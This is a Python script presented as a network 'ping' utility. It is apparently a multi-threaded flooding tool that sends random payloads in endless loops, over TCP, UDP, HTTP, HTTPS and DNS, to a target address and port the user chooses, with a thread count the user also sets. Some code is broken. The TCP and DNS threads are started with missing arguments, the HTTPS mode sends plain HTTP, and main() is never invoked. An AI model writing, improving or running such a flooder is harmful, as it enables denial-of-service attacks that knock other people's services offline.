import sys
import socket
import threading
import random
import time
import string
import ipaddress
from termcolor import colored
from colorama import Fore, Style

def randomString(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def tcp_ping(ip, port, data_size):
    while True:
        try:
            ipaddress.IPv4Address(ip)
        except ipaddress.AddressValueError:
            print(f"Invalid IP address or domain name: {ip}")
            return
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            s.connect((ip, port))
            s.send(randomString(data_size).encode())
            s.close()
            print(f"{Fore.GREEN}TCP ping successful{Fore.RESET}")
        except:
            print(f"{Fore.RED}TCP ping failed{Fore.RESET}")
            time.sleep(5)
            continue

def dns_ping(ip, port, data_size):
    while True:
        try:
            socket.gethostbyname(ip)
        except socket.gaierror:
            print(f"Invalid IP address or domain name: {ip}")
            return
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(randomString(data_size).encode(), (ip, port))
            s.close()
            print(f"{Fore.GREEN}DNS ping successful{Fore.RESET}")
        except:
            print(f"{Fore.RED}DNS ping failed{Fore.RESET}")
            time.sleep(5)
            continue

def http_ping(ip, port, data_size):
    while True:
        try:
            ipaddress.IPv4Address(ip)
        except ipaddress.AddressValueError:
            print(f"Invalid IP address or domain name: {ip}")
            return
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
            s.send(randomString(data_size).encode())
            s.close()
            print(f"{Fore.GREEN}HTTP ping successful{Fore.RESET}")
        except:
            print(f"{Fore.RED}HTTP ping failed{Fore.RESET}")
            time.sleep(5)
            continue

def https_ping(ip, port, data_size):
    while True:
        try:
            ipaddress.IPv4Address(ip)
        except ipaddress.AddressValueError:
            print(f"Invalid IP address or domain name: {ip}")
            return
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
            s.send(randomString(data_size).encode())
            s.close()
            print(colored(f"HTTPS ping sent to {ip}:{port} with {data_size} bytes of data", "magenta"))
        except:
            print(colored(f"Failed to send HTTPS ping to {ip}:{port}", "red"))
            time.sleep(5)
            continue

def udp_ping(ip, port, data_size):
    while True:
        try:
            ipaddress.IPv4Address(ip)
        except ipaddress.AddressValueError:
            print(f"Invalid IP address or domain name: {ip}")
            return
        
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            s.sendto(randomString(data_size).encode(), (ip, port))
            print(f"Sent UDP packet to {ip}:{port} with {data_size} bytes of data")
        except:
            print(f"Failed to send UDP packet to {ip}:{port}")
            time.sleep(5)
            continue


def main():
    ping_type = input("Enter ping type (TCP, DNS, HTTP, HTTPS, UDP): ").lower()
    ip = input("Enter IP address or domain name: ")
    port = int(input("Enter port number: "))
    thread_count = int(input("Enter number of threads: "))
    data_size = int(input("Enter data size in bytes: "))

    if ping_type == "tcp":
        for i in range(thread_count):
            t = threading.Thread(target=tcp_ping, args=(ip, port))
            t.daemon = True
            t.start()

    elif ping_type == "dns":
        for i in range(thread_count):
            t = threading.Thread(target=dns_ping, args=(ip,))
            t.daemon = True
            t.start()

    elif ping_type == "udp":
        for i in range(thread_count):
            t = threading.Thread(target=udp_ping, args=(ip, port, data_size))
            t.daemon = True
            t.start()

    elif ping_type == "http":
        for i in range(thread_count):
            t = threading.Thread(target=http_ping, args=(ip, port, data_size))
            t.daemon = True
            t.start()

    elif ping_type == "https":
        for i in range(thread_count):
            t = threading.Thread(target=https_ping, args=(ip, port, data_size))
            t.daemon = True
            t.start()

    else:
        print("Invalid ping type")

    while True:
        time.sleep(1)